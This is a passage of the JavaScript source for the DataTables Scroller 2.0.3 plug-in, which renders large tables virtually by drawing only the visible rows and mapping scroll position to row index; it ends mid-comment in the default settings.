/*! Scroller 2.0.3
 * ©2011-2020 SpryMedia Ltd - datatables.net/license
 */

/**
 * @summary     Scroller
 * @description Virtual rendering for DataTables
 * @version     2.0.3
 * @file        dataTables.scroller.js
 * @author      SpryMedia Ltd (www.sprymedia.co.uk)
 * @contact     www.sprymedia.co.uk/contact
 * @copyright   Copyright 2011-2020 SpryMedia Ltd.
 *
 * This source file is free software, available under the following license:
 *   MIT license - http://datatables.net/license/mit
 *
 * This source file is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the license files for details.
 *
 * For details please refer to: http://www.datatables.net
 */

(function( factory ){
	if ( typeof define === 'function' && define.amd ) {
		// AMD
		define( ['jquery', 'datatables.net'], function ( $ ) {
			return factory( $, window, document );
		} );
	}
	else if ( typeof exports === 'object' ) {
		// CommonJS
		module.exports = function (root, $) {
			if ( ! root ) {
				root = window;
			}

			if ( ! $ || ! $.fn.dataTable ) {
				$ = require('datatables.net')(root, $).$;
			}

			return factory( $, root, root.document );
		};
	}
	else {
		// Browser
		factory( jQuery, window, document );
	}
}(function( $, window, document, undefined ) {
'use strict';
var DataTable = $.fn.dataTable;


/**
 * Scroller is a virtual rendering plug-in for DataTables which allows large
 * datasets to be drawn on screen every quickly. What the virtual rendering means
 * is that only the visible portion of the table (and a bit to either side to make
 * the scrolling smooth) is drawn, while the scrolling container gives the
 * visual impression that the whole table is visible. This is done by making use
 * of the pagination abilities of DataTables and moving the table around in the
 * scrolling container DataTables adds to the page. The scrolling container is
 * forced to the height it would be for the full table display using an extra
 * element.
 *
 * Note that rows in the table MUST all be the same height. Information in a cell
 * which expands on to multiple lines will cause some odd behaviour in the scrolling.
 *
 * Scroller is initialised by simply including the letter 'S' in the sDom for the
 * table you want to have this feature enabled on. Note that the 'S' must come
 * AFTER the 't' parameter in `dom`.
 *
 * Key features include:
 *   <ul class="limit_length">
 *     <li>Speed! The aim of Scroller for DataTables is to make rendering large data sets fast</li>
 *     <li>Full compatibility with deferred rendering in DataTables for maximum speed</li>
 *     <li>Display millions of rows</li>
 *     <li>Integration with state saving in DataTables (scrolling position is saved)</li>
 *     <li>Easy to use</li>
 *   </ul>
 *
 *  @class
 *  @constructor
 *  @global
 *  @param {object} dt DataTables settings object or API instance
 *  @param {object} [opts={}] Configuration object for FixedColumns. Options 
 *    are defined by {@link Scroller.defaults}
 *
 *  @requires jQuery 1.7+
 *  @requires DataTables 1.10.0+
 *
 *  @example
 *    $(document).ready(function() {
 *        $('#example').DataTable( {
 *            "scrollY": "200px",
 *            "ajax": "media/dataset/large.txt",
 *            "scroller": true,
 *            "deferRender": true
 *        } );
 *    } );
 */
var Scroller = function ( dt, opts ) {
	/* Sanity check - you just know it will happen */
	if ( ! (this instanceof Scroller) ) {
		alert( "Scroller warning: Scroller must be initialised with the 'new' keyword." );
		return;
	}

	if ( opts === undefined ) {
		opts = {};
	}

	var dtApi = $.fn.dataTable.Api( dt );

	/**
	 * Settings object which contains customisable information for the Scroller instance
	 * @namespace
	 * @private
	 * @extends Scroller.defaults
	 */
	this.s = {
		/**
		 * DataTables settings object
		 *  @type     object
		 *  @default  Passed in as first parameter to constructor
		 */
		dt: dtApi.settings()[0],

		/**
		 * DataTables API instance
		 *  @type     DataTable.Api
		 */
		dtApi: dtApi,

		/**
		 * Pixel location of the top of the drawn table in the viewport
		 *  @type     int
		 *  @default  0
		 */
		tableTop: 0,

		/**
		 * Pixel location of the bottom of the drawn table in the viewport
		 *  @type     int
		 *  @default  0
		 */
		tableBottom: 0,

		/**
		 * Pixel location of the boundary for when the next data set should be loaded and drawn
		 * when scrolling up the way.
		 *  @type     int
		 *  @default  0
		 *  @private
		 */
		redrawTop: 0,

		/**
		 * Pixel location of the boundary for when the next data set should be loaded and drawn
		 * when scrolling down the way. Note that this is actually calculated as the offset from
		 * the top.
		 *  @type     int
		 *  @default  0
		 *  @private
		 */
		redrawBottom: 0,

		/**
		 * Auto row height or not indicator
		 *  @type     bool
		 *  @default  0
		 */
		autoHeight: true,

		/**
		 * Number of rows calculated as visible in the visible viewport
		 *  @type     int
		 *  @default  0
		 */
		viewportRows: 0,

		/**
		 * setTimeout reference for state saving, used when state saving is enabled in the DataTable
		 * and when the user scrolls the viewport in order to stop the cookie set taking too much
		 * CPU!
		 *  @type     int
		 *  @default  0
		 */
		stateTO: null,

		stateSaveThrottle: function () {},

		/**
		 * setTimeout reference for the redraw, used when server-side processing is enabled in the
		 * DataTables in order to prevent DoSing the server
		 *  @type     int
		 *  @default  null
		 */
		drawTO: null,

		heights: {
			jump: null,
			page: null,
			virtual: null,
			scroll: null,

			/**
			 * Height of rows in the table
			 *  @type     int
			 *  @default  0
			 */
			row: null,

			/**
			 * Pixel height of the viewport
			 *  @type     int
			 *  @default  0
			 */
			viewport: null,
			labelFactor: 1
		},

		topRowFloat: 0,
		scrollDrawDiff: null,
		loaderVisible: false,
		forceReposition: false,
		baseRowTop: 0,
		baseScrollTop: 0,
		mousedown: false,
		lastScrollTop: 0
	};

	// @todo The defaults should extend a `c` property and the internal settings
	// only held in the `s` property. At the moment they are mixed
	this.s = $.extend( this.s, Scroller.oDefaults, opts );

	// Workaround for row height being read from height object (see above comment)
	this.s.heights.row = this.s.rowHeight;

	/**
	 * DOM elements used by the class instance
	 * @private
	 * @namespace
	 *
	 */
	this.dom = {
		"force":    document.createElement('div'),
		"label":    $('<div class="dts_label">0</div>'),
		"scroller": null,
		"table":    null,
		"loader":   null
	};

	// Attach the instance to the DataTables instance so it can be accessed in
	// future. Don't initialise Scroller twice on the same table
	if ( this.s.dt.oScroller ) {
		return;
	}

	this.s.dt.oScroller = this;

	/* Let's do it */
	this.construct();
};



$.extend( Scroller.prototype, {
	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Public methods - to be exposed via the DataTables API
	 */

	/**
	 * Calculate and store information about how many rows are to be displayed
	 * in the scrolling viewport, based on current dimensions in the browser's
	 * rendering. This can be particularly useful if the table is initially
	 * drawn in a hidden element - for example in a tab.
	 *  @param {bool} [redraw=true] Redraw the table automatically after the recalculation, with
	 *    the new dimensions forming the basis for the draw.
	 *  @returns {void}
	 */
	measure: function ( redraw )
	{
		if ( this.s.autoHeight )
		{
			this._calcRowHeight();
		}

		var heights = this.s.heights;

		if ( heights.row ) {
			heights.viewport = this._parseHeight($(this.dom.scroller).css('max-height'));

			this.s.viewportRows = parseInt( heights.viewport / heights.row, 10 )+1;
			this.s.dt._iDisplayLength = this.s.viewportRows * this.s.displayBuffer;
		}

		var label = this.dom.label.outerHeight();
		heights.labelFactor = (heights.viewport-label) / heights.scroll;

		if ( redraw === undefined || redraw )
		{
			this.s.dt.oInstance.fnDraw( false );
		}
	},

	/**
	 * Get information about current displayed record range. This corresponds to
	 * the information usually displayed in the "Info" block of the table.
	 *
	 * @returns {object} info as an object:
	 *  {
	 *      start: {int}, // the 0-indexed record at the top of the viewport
	 *      end:   {int}, // the 0-indexed record at the bottom of the viewport
	 *  }
	*/
	pageInfo: function()
	{
		var 
			dt = this.s.dt,
			iScrollTop = this.dom.scroller.scrollTop,
			iTotal = dt.fnRecordsDisplay(),
			iPossibleEnd = Math.ceil(this.pixelsToRow(iScrollTop + this.s.heights.viewport, false, this.s.ani));

		return {
			start: Math.floor(this.pixelsToRow(iScrollTop, false, this.s.ani)),
			end: iTotal < iPossibleEnd ? iTotal-1 : iPossibleEnd-1
		};
	},

	/**
	 * Calculate the row number that will be found at the given pixel position
	 * (y-scroll).
	 *
	 * Please note that when the height of the full table exceeds 1 million
	 * pixels, Scroller switches into a non-linear mode for the scrollbar to fit
	 * all of the records into a finite area, but this function returns a linear
	 * value (relative to the last non-linear positioning).
	 *  @param {int} pixels Offset from top to calculate the row number of
	 *  @param {int} [intParse=true] If an integer value should be returned
	 *  @param {int} [virtual=false] Perform the calculations in the virtual domain
	 *  @returns {int} Row index
	 */
	pixelsToRow: function ( pixels, intParse, virtual )
	{
		var diff = pixels - this.s.baseScrollTop;
		var row = virtual ?
			(this._domain( 'physicalToVirtual', this.s.baseScrollTop ) + diff) / this.s.heights.row :
			( diff / this.s.heights.row ) + this.s.baseRowTop;

		return intParse || intParse === undefined ?
			parseInt( row, 10 ) :
			row;
	},

	/**
	 * Calculate the pixel position from the top of the scrolling container for
	 * a given row
	 *  @param {int} iRow Row number to calculate the position of
	 *  @returns {int} Pixels
	 */
	rowToPixels: function ( rowIdx, intParse, virtual )
	{
		var pixels;
		var diff = rowIdx - this.s.baseRowTop;

		if ( virtual ) {
			pixels = this._domain( 'virtualToPhysical', this.s.baseScrollTop );
			pixels += diff * this.s.heights.row;
		}
		else {
			pixels = this.s.baseScrollTop;
			pixels += diff * this.s.heights.row;
		}

		return intParse || intParse === undefined ?
			parseInt( pixels, 10 ) :
			pixels;
	},


	/**
	 * Calculate the row number that will be found at the given pixel position (y-scroll)
	 *  @param {int} row Row index to scroll to
	 *  @param {bool} [animate=true] Animate the transition or not
	 *  @returns {void}
	 */
	scrollToRow: function ( row, animate )
	{
		var that = this;
		var ani = false;
		var px = this.rowToPixels( row );

		// We need to know if the table will redraw or not before doing the
		// scroll. If it will not redraw, then we need to use the currently
		// displayed table, and scroll with the physical pixels. Otherwise, we
		// need to calculate the table's new position from the virtual
		// transform.
		var preRows = ((this.s.displayBuffer-1)/2) * this.s.viewportRows;
		var drawRow = row - preRows;
		if ( drawRow < 0 ) {
			drawRow = 0;
		}

		if ( (px > this.s.redrawBottom || px < this.s.redrawTop) && this.s.dt._iDisplayStart !== drawRow ) {
			ani = true;
			px = this._domain( 'virtualToPhysical', row * this.s.heights.row );

			// If we need records outside the current draw region, but the new
			// scrolling position is inside that (due to the non-linear nature
			// for larger numbers of records), we need to force position update.
			if ( this.s.redrawTop < px && px < this.s.redrawBottom ) {
				this.s.forceReposition = true;
				animate = false;
			}
		}

		if ( animate === undefined || animate )
		{
			this.s.ani = ani;
			$(this.dom.scroller).animate( {
				"scrollTop": px
			}, function () {
				// This needs to happen after the animation has completed and
				// the final scroll event fired
				setTimeout( function () {
					that.s.ani = false;
				}, 250 );
			} );
		}
		else
		{
			$(this.dom.scroller).scrollTop( px );
		}
	},


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Constructor
	 */

	/**
	 * Initialisation for Scroller
	 *  @returns {void}
	 *  @private
	 */
	construct: function ()
	{
		var that = this;
		var dt = this.s.dtApi;

		/* Sanity check */
		if ( !this.s.dt.oFeatures.bPaginate ) {
			this.s.dt.oApi._fnLog( this.s.dt, 0, 'Pagination must be enabled for Scroller' );
			return;
		}

		/* Insert a div element that we can use to force the DT scrolling container to
		 * the height that would be required if the whole table was being displayed
		 */
		this.dom.force.style.position = "relative";
		this.dom.force.style.top = "0px";
		this.dom.force.style.left = "0px";
		this.dom.force.style.width = "1px";

		this.dom.scroller = $('div.'+this.s.dt.oClasses.sScrollBody, this.s.dt.nTableWrapper)[0];
		this.dom.scroller.appendChild( this.dom.force );
		this.dom.scroller.style.position = "relative";

		this.dom.table = $('>table', this.dom.scroller)[0];
		this.dom.table.style.position = "absolute";
		this.dom.table.style.top = "0px";
		this.dom.table.style.left = "0px";

		// Add class to 'announce' that we are a Scroller table
		$(dt.table().container()).addClass('dts DTS');

		// Add a 'loading' indicator
		if ( this.s.loadingIndicator )
		{
			this.dom.loader = $('<div class="dataTables_processing dts_loading">'+this.s.dt.oLanguage.sLoadingRecords+'</div>')
				.css('display', 'none');

			$(this.dom.scroller.parentNode)
				.css('position', 'relative')
				.append( this.dom.loader );
		}

		this.dom.label.appendTo(this.dom.scroller);

		/* Initial size calculations */
		if ( this.s.heights.row && this.s.heights.row != 'auto' )
		{
			this.s.autoHeight = false;
		}

		// Scrolling callback to see if a page change is needed
		this.s.ingnoreScroll = true;
		$(this.dom.scroller).on( 'scroll.dt-scroller', function (e) {
			that._scroll.call( that );
		} );

		// In iOS we catch the touchstart event in case the user tries to scroll
		// while the display is already scrolling
		$(this.dom.scroller).on('touchstart.dt-scroller', function () {
			that._scroll.call( that );
		} );

		$(this.dom.scroller)
			.on('mousedown.dt-scroller', function () {
				that.s.mousedown = true;
			})
			.on('mouseup.dt-scroller', function () {
				that.s.labelVisible = false;
				that.s.mousedown = false;
				that.dom.label.css('display', 'none');
			});

		// On resize, update the information element, since the number of rows shown might change
		$(window).on( 'resize.dt-scroller', function () {
			that.measure( false );
			that._info();
		} );

		// Add a state saving parameter to the DT state saving so we can restore the exact
		// position of the scrolling.
		var initialStateSave = true;
		var loadedState = dt.state.loaded();

		dt.on( 'stateSaveParams.scroller', function ( e, settings, data ) {
			if ( initialStateSave && loadedState ) {
				data.scroller = loadedState.scroller;
				initialStateSave = false;
			}
			else {
				// Need to used the saved position on init
				data.scroller = {
					topRow: that.s.topRowFloat,
					baseScrollTop: that.s.baseScrollTop,
					baseRowTop: that.s.baseRowTop,
					scrollTop: that.s.lastScrollTop
				};
			}
		} );

		if ( loadedState && loadedState.scroller ) {
			this.s.topRowFloat = loadedState.scroller.topRow;
			this.s.baseScrollTop = loadedState.scroller.baseScrollTop;
			this.s.baseRowTop = loadedState.scroller.baseRowTop;
		}

		this.measure( false );
	
		that.s.stateSaveThrottle = that.s.dt.oApi._fnThrottle( function () {
			that.s.dtApi.state.save();
		}, 500 );

		dt.on( 'init.scroller', function () {
			that.measure( false );

			// Setting to `jump` will instruct _draw to calculate the scroll top
			// position
			that.s.scrollType = 'jump';
			that._draw();

			// Update the scroller when the DataTable is redrawn
			dt.on( 'draw.scroller', function () {
				that._draw();
			});
		} );

		// Set height before the draw happens, allowing everything else to update
		// on draw complete without worry for roder.
		dt.on( 'preDraw.dt.scroller', function () {
			that._scrollForce();
		} );

		// Destructor
		dt.on( 'destroy.scroller', function () {
			$(window).off( 'resize.dt-scroller' );
			$(that.dom.scroller).off('.dt-scroller');
			$(that.s.dt.nTable).off( '.scroller' );

			$(that.s.dt.nTableWrapper).removeClass('DTS');
			$('div.DTS_Loading', that.dom.scroller.parentNode).remove();

			that.dom.table.style.position = "";
			that.dom.table.style.top = "";
			that.dom.table.style.left = "";
		} );
	},


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Private methods
	 */

	/**
	 * Automatic calculation of table row height. This is just a little tricky here as using
	 * initialisation DataTables has tale the table out of the document, so we need to create
	 * a new table and insert it into the document, calculate the row height and then whip the
	 * table out.
	 *  @returns {void}
	 *  @private
	 */
	_calcRowHeight: function ()
	{
		var dt = this.s.dt;
		var origTable = dt.nTable;
		var nTable = origTable.cloneNode( false );
		var tbody = $('<tbody/>').appendTo( nTable );
		var container = $(
			'<div class="'+dt.oClasses.sWrapper+' DTS">'+
				'<div class="'+dt.oClasses.sScrollWrapper+'">'+
					'<div class="'+dt.oClasses.sScrollBody+'"></div>'+
				'</div>'+
			'</div>'
		);

		// Want 3 rows in the sizing table so :first-child and :last-child
		// CSS styles don't come into play - take the size of the middle row
		$('tbody tr:lt(4)', origTable).clone().appendTo( tbody );
        var rowsCount = $('tr', tbody).length;

        if ( rowsCount === 1 ) {
            tbody.prepend('<tr><td>&#160;</td></tr>');
            tbody.append('<tr><td>&#160;</td></tr>');
		}
		else {
            for (; rowsCount < 3; rowsCount++) {
                tbody.append('<tr><td>&#160;</td></tr>');
            }
		}
	
		$('div.'+dt.oClasses.sScrollBody, container).append( nTable );

		// If initialised using `dom`, use the holding element as the insert point
		var insertEl = this.s.dt.nHolding || origTable.parentNode;

		if ( ! $(insertEl).is(':visible') ) {
			insertEl = 'body';
		}

		// Remove form element links as they might select over others (particularly radio and checkboxes)
		container.find("input").removeAttr("name");

		container.appendTo( insertEl );
		this.s.heights.row = $('tr', tbody).eq(1).outerHeight();

		container.remove();
	},

	/**
	 * Draw callback function which is fired when the DataTable is redrawn. The main function of
	 * this method is to position the drawn table correctly the scrolling container for the rows
	 * that is displays as a result of the scrolling position.
	 *  @returns {void}
	 *  @private
	 */
	_draw: function ()
	{
		var
			that = this,
			heights = this.s.heights,
			iScrollTop = this.dom.scroller.scrollTop,
			iTableHeight = $(this.s.dt.nTable).height(),
			displayStart = this.s.dt._iDisplayStart,
			displayLen = this.s.dt._iDisplayLength,
			displayEnd = this.s.dt.fnRecordsDisplay();

		// Disable the scroll event listener while we are updating the DOM
		this.s.skip = true;

		// If paging is reset
		if ( (this.s.dt.bSorted || this.s.dt.bFiltered) && displayStart === 0 && !this.s.dt._drawHold ) {
			this.s.topRowFloat = 0;
		}

		iScrollTop = this.s.scrollType === 'jump' ?
			this._domain( 'virtualToPhysical', this.s.topRowFloat * heights.row ) :
			iScrollTop;

		// Store positional information so positional calculations can be based
		// upon the current table draw position
		this.s.baseScrollTop = iScrollTop;
		this.s.baseRowTop = this.s.topRowFloat;

		// Position the table in the virtual scroller
		var tableTop = iScrollTop - ((this.s.topRowFloat - displayStart) * heights.row);
		if ( displayStart === 0 ) {
			tableTop = 0;
		}
		else if ( displayStart + displayLen >= displayEnd ) {
			tableTop = heights.scroll - iTableHeight;
		}

		this.dom.table.style.top = tableTop+'px';

		/* Cache some information for the scroller */
		this.s.tableTop = tableTop;
		this.s.tableBottom = iTableHeight + this.s.tableTop;

		// Calculate the boundaries for where a redraw will be triggered by the
		// scroll event listener
		var boundaryPx = (iScrollTop - this.s.tableTop) * this.s.boundaryScale;
		this.s.redrawTop = iScrollTop - boundaryPx;
		this.s.redrawBottom = iScrollTop + boundaryPx > heights.scroll - heights.viewport - heights.row ?
			heights.scroll - heights.viewport - heights.row :
			iScrollTop + boundaryPx;

		this.s.skip = false;

		// Restore the scrolling position that was saved by DataTable's state
		// saving Note that this is done on the second draw when data is Ajax
		// sourced, and the first draw when DOM soured
		if ( this.s.dt.oFeatures.bStateSave && this.s.dt.oLoadedState !== null &&
			 typeof this.s.dt.oLoadedState.scroller != 'undefined' )
		{
			// A quirk of DataTables is that the draw callback will occur on an
			// empty set if Ajax sourced, but not if server-side processing.
			var ajaxSourced = (this.s.dt.sAjaxSource || that.s.dt.ajax) && ! this.s.dt.oFeatures.bServerSide ?
				true :
				false;

			if ( ( ajaxSourced && this.s.dt.iDraw == 2) ||
			     (!ajaxSourced && this.s.dt.iDraw == 1) )
			{
				setTimeout( function () {
					$(that.dom.scroller).scrollTop( that.s.dt.oLoadedState.scroller.scrollTop );

					// In order to prevent layout thrashing we need another
					// small delay
					setTimeout( function () {
						that.s.ingnoreScroll = false;
					}, 0 );
				}, 0 );
			}
		}
		else {
			that.s.ingnoreScroll = false;
		}

		// Because of the order of the DT callbacks, the info update will
		// take precedence over the one we want here. So a 'thread' break is
		// needed.  Only add the thread break if bInfo is set
		if ( this.s.dt.oFeatures.bInfo ) {
			setTimeout( function () {
				that._info.call( that );
			}, 0 );
		}

		// Hide the loading indicator
		if ( this.dom.loader && this.s.loaderVisible ) {
			this.dom.loader.css( 'display', 'none' );
			this.s.loaderVisible = false;
		}
	},

	/**
	 * Convert from one domain to another. The physical domain is the actual
	 * pixel count on the screen, while the virtual is if we had browsers which
	 * had scrolling containers of infinite height (i.e. the absolute value)
	 *
	 *  @param {string} dir Domain transform direction, `virtualToPhysical` or
	 *    `physicalToVirtual` 
	 *  @returns {number} Calculated transform
	 *  @private
	 */
	_domain: function ( dir, val )
	{
		var heights = this.s.heights;
		var diff;
		var magic = 10000; // the point at which the non-linear calculations start to happen

		// If the virtual and physical height match, then we use a linear
		// transform between the two, allowing the scrollbar to be linear
		if ( heights.virtual === heights.scroll ) {
			return val;
		}

		// In the first 10k pixels and the last 10k pixels, we want the scrolling
		// to be linear. After that it can be non-linear. It would be unusual for
		// anyone to mouse wheel through that much.
		if ( val < magic ) {
			return val;
		}
		else if ( dir === 'virtualToPhysical' && val >= heights.virtual - magic ) {
			diff = heights.virtual - val;
			return heights.scroll - diff;
		}
		else if ( dir === 'physicalToVirtual' && val >= heights.scroll - magic ) {
			diff = heights.scroll - val;
			return heights.virtual - diff;
		}

		// Otherwise, we want a non-linear scrollbar to take account of the
		// redrawing regions at the start and end of the table, otherwise these
		// can stutter badly - on large tables 30px (for example) scroll might
		// be hundreds of rows, so the table would be redrawing every few px at
		// the start and end. Use a simple linear eq. to stop this, effectively
		// causing a kink in the scrolling ratio. It does mean the scrollbar is
		// non-linear, but with such massive data sets, the scrollbar is going
		// to be a best guess anyway
		var m = (heights.virtual - magic - magic) / (heights.scroll - magic - magic);
		var c = magic - (m*magic);

		return dir === 'virtualToPhysical' ?
			(val-c) / m :
			(m*val) + c;
	},

	/**
	 * Update any information elements that are controlled by the DataTable based on the scrolling
	 * viewport and what rows are visible in it. This function basically acts in the same way as
	 * _fnUpdateInfo in DataTables, and effectively replaces that function.
	 *  @returns {void}
	 *  @private
	 */
	_info: function ()
	{
		if ( !this.s.dt.oFeatures.bInfo )
		{
			return;
		}

		var
			dt = this.s.dt,
			language = dt.oLanguage,
			iScrollTop = this.dom.scroller.scrollTop,
			iStart = Math.floor( this.pixelsToRow(iScrollTop, false, this.s.ani)+1 ),
			iMax = dt.fnRecordsTotal(),
			iTotal = dt.fnRecordsDisplay(),
			iPossibleEnd = Math.ceil( this.pixelsToRow(iScrollTop+this.s.heights.viewport, false, this.s.ani) ),
			iEnd = iTotal < iPossibleEnd ? iTotal : iPossibleEnd,
			sStart = dt.fnFormatNumber( iStart ),
			sEnd = dt.fnFormatNumber( iEnd ),
			sMax = dt.fnFormatNumber( iMax ),
			sTotal = dt.fnFormatNumber( iTotal ),
			sOut;

		if ( dt.fnRecordsDisplay() === 0 &&
			   dt.fnRecordsDisplay() == dt.fnRecordsTotal() )
		{
			/* Empty record set */
			sOut = language.sInfoEmpty+ language.sInfoPostFix;
		}
		else if ( dt.fnRecordsDisplay() === 0 )
		{
			/* Empty record set after filtering */
			sOut = language.sInfoEmpty +' '+
				language.sInfoFiltered.replace('_MAX_', sMax)+
					language.sInfoPostFix;
		}
		else if ( dt.fnRecordsDisplay() == dt.fnRecordsTotal() )
		{
			/* Normal record set */
			sOut = language.sInfo.
					replace('_START_', sStart).
					replace('_END_',   sEnd).
					replace('_MAX_',   sMax).
					replace('_TOTAL_', sTotal)+
				language.sInfoPostFix;
		}
		else
		{
			/* Record set after filtering */
			sOut = language.sInfo.
					replace('_START_', sStart).
					replace('_END_',   sEnd).
					replace('_MAX_',   sMax).
					replace('_TOTAL_', sTotal) +' '+
				language.sInfoFiltered.replace(
					'_MAX_',
					dt.fnFormatNumber(dt.fnRecordsTotal())
				)+
				language.sInfoPostFix;
		}

		var callback = language.fnInfoCallback;
		if ( callback ) {
			sOut = callback.call( dt.oInstance,
				dt, iStart, iEnd, iMax, iTotal, sOut
			);
		}

		var n = dt.aanFeatures.i;
		if ( typeof n != 'undefined' )
		{
			for ( var i=0, iLen=n.length ; i<iLen ; i++ )
			{
				$(n[i]).html( sOut );
			}
		}

		// DT doesn't actually (yet) trigger this event, but it will in future
		$(dt.nTable).triggerHandler( 'info.dt' );
	},

	/**
	 * Parse CSS height property string as number
	 *
	 * An attempt is made to parse the string as a number. Currently supported units are 'px',
	 * 'vh', and 'rem'. 'em' is partially supported; it works as long as the parent element's
	 * font size matches the body element. Zero is returned for unrecognized strings.
	 *  @param {string} cssHeight CSS height property string
	 *  @returns {number} height
	 *  @private
	 */
	_parseHeight: function(cssHeight) {
		var height;
		var matches = /^([+-]?(?:\d+(?:\.\d+)?|\.\d+))(px|em|rem|vh)$/.exec(cssHeight);

		if (matches === null) {
			return 0;
		}

		var value = parseFloat(matches[1]);
		var unit = matches[2];

		if ( unit === 'px' ) {
			height = value;
		}
		else if ( unit === 'vh' ) {
			height = ( value / 100 ) * $(window).height();
		}
		else if ( unit === 'rem' ) {
			height = value * parseFloat($(':root').css('font-size'));
		}
		else if ( unit === 'em' ) {
			height = value * parseFloat($('body').css('font-size'));
		}

		return height ?
			height :
			0;
	},

	/**
	 * Scrolling function - fired whenever the scrolling position is changed.
	 * This method needs to use the stored values to see if the table should be
	 * redrawn as we are moving towards the end of the information that is
	 * currently drawn or not. If needed, then it will redraw the table based on
	 * the new position.
	 *  @returns {void}
	 *  @private
	 */
	_scroll: function ()
	{
		var
			that = this,
			heights = this.s.heights,
			iScrollTop = this.dom.scroller.scrollTop,
			iTopRow;

		if ( this.s.skip ) {
			return;
		}

		if ( this.s.ingnoreScroll ) {
			return;
		}

		if ( iScrollTop === this.s.lastScrollTop ) {
			return;
		}

		/* If the table has been sorted or filtered, then we use the redraw that
		 * DataTables as done, rather than performing our own
		 */
		if ( this.s.dt.bFiltered || this.s.dt.bSorted ) {
			this.s.lastScrollTop = 0;
			return;
		}

		/* Update the table's information display for what is now in the viewport */
		this._info();

		/* We don't want to state save on every scroll event - that's heavy
		 * handed, so use a timeout to update the state saving only when the
		 * scrolling has finished
		 */
		clearTimeout( this.s.stateTO );
		this.s.stateTO = setTimeout( function () {
			that.s.dtApi.state.save();
		}, 250 );

		this.s.scrollType = Math.abs(iScrollTop - this.s.lastScrollTop) > heights.viewport ?
			'jump' :
			'cont';

		this.s.topRowFloat = this.s.scrollType === 'cont' ?
			this.pixelsToRow( iScrollTop, false, false ) :
			this._domain( 'physicalToVirtual', iScrollTop ) / heights.row;

		if ( this.s.topRowFloat < 0 ) {
			this.s.topRowFloat = 0;
		}

		/* Check if the scroll point is outside the trigger boundary which would required
		 * a DataTables redraw
		 */
		if ( this.s.forceReposition || iScrollTop < this.s.redrawTop || iScrollTop > this.s.redrawBottom ) {
			var preRows = Math.ceil( ((this.s.displayBuffer-1)/2) * this.s.viewportRows );

			iTopRow = parseInt(this.s.topRowFloat, 10) - preRows;
			this.s.forceReposition = false;

			if ( iTopRow <= 0 ) {
				/* At the start of the table */
				iTopRow = 0;
			}
			else if ( iTopRow + this.s.dt._iDisplayLength > this.s.dt.fnRecordsDisplay() ) {
				/* At the end of the table */
				iTopRow = this.s.dt.fnRecordsDisplay() - this.s.dt._iDisplayLength;
				if ( iTopRow < 0 ) {
					iTopRow = 0;
				}
			}
			else if ( iTopRow % 2 !== 0 ) {
				// For the row-striping classes (odd/even) we want only to start
				// on evens otherwise the stripes will change between draws and
				// look rubbish
				iTopRow++;
			}

			// Store calcuated value, in case the following condition is not met, but so
			// that the draw function will still use it.
			this.s.targetTop = iTopRow;

			if ( iTopRow != this.s.dt._iDisplayStart ) {
				/* Cache the new table position for quick lookups */
				this.s.tableTop = $(this.s.dt.nTable).offset().top;
				this.s.tableBottom = $(this.s.dt.nTable).height() + this.s.tableTop;

				var draw = function () {
					that.s.dt._iDisplayStart = that.s.targetTop;
					that.s.dt.oApi._fnDraw( that.s.dt );
				};

				/* Do the DataTables redraw based on the calculated start point - note that when
				 * using server-side processing we introduce a small delay to not DoS the server...
				 */
				if ( this.s.dt.oFeatures.bServerSide ) {
					this.s.forceReposition = true;

					clearTimeout( this.s.drawTO );
					this.s.drawTO = setTimeout( draw, this.s.serverWait );
				}
				else {
					draw();
				}

				if ( this.dom.loader && ! this.s.loaderVisible ) {
					this.dom.loader.css( 'display', 'block' );
					this.s.loaderVisible = true;
				}
			}
		}
		else {
			this.s.topRowFloat = this.pixelsToRow( iScrollTop, false, true );
		}

		this.s.lastScrollTop = iScrollTop;
		this.s.stateSaveThrottle();

		if ( this.s.scrollType === 'jump' && this.s.mousedown ) {
			this.s.labelVisible = true;
		}
		if (this.s.labelVisible) {
			this.dom.label
				.html( this.s.dt.fnFormatNumber( parseInt( this.s.topRowFloat, 10 )+1 ) )
				.css( 'top', iScrollTop + (iScrollTop * heights.labelFactor ) )
				.css( 'display', 'block' );
		}
	},

	/**
	 * Force the scrolling container to have height beyond that of just the
	 * table that has been drawn so the user can scroll the whole data set.
	 *
	 * Note that if the calculated required scrolling height exceeds a maximum
	 * value (1 million pixels - hard-coded) the forcing element will be set
	 * only to that maximum value and virtual / physical domain transforms will
	 * be used to allow Scroller to display tables of any number of records.
	 *  @returns {void}
	 *  @private
	 */
	_scrollForce: function ()
	{
		var heights = this.s.heights;
		var max = 1000000;

		heights.virtual = heights.row * this.s.dt.fnRecordsDisplay();
		heights.scroll = heights.virtual;

		if ( heights.scroll > max ) {
			heights.scroll = max;
		}

		// Minimum height so there is always a row visible (the 'no rows found'
		// if reduced to zero filtering)
		this.dom.force.style.height = heights.scroll > this.s.heights.row ?
			heights.scroll+'px' :
			this.s.heights.row+'px';
	}
} );



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Statics
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */


/**
 * Scroller default settings for initialisation
 *  @namespace
 *  @name Scroller.defaults
 *  @static
 */
Scroller.defaults = {
	/**
	 * Scroller uses the boundary scaling factor to decide when to redraw the table - which it
	 * typically does before you reach the end of the currently loaded data set (in order to
	 * allow the data to look continuous to a user scrolling through the data). If given as 0
	 * then the table will be redrawn whenever the viewport is scrolled, while 1 would not
	 * redraw the table until the currently loaded data has all been shown. You will want
	 * something in the middle - the default factor of 0.5 is usually suitable.
	 *  @type     float
	 *  @default  0.5
	 *  @static
	 */
	boundaryScale: 0.5,

	/**
	 * The display buffer is what Scroller uses to calculate how many rows it should pre-fetch
	 * for scrolling. Scroller automatically adjusts DataTables' display length to pre-fetch
	 * rows that will be shown in "near scrolling" (i.e. just beyond the current display area).
	 * The value is based upon the number of rows that can be displayed in the viewport (i.e.
	 * a value of 1), and will apply the display range to records before before and after the
	 * current viewport - i.e. a factor of 3 will allow Scroller to pre-fetch 1 viewport's worth
	 * of rows before the current viewport, the current viewport's rows and 1 viewport's worth
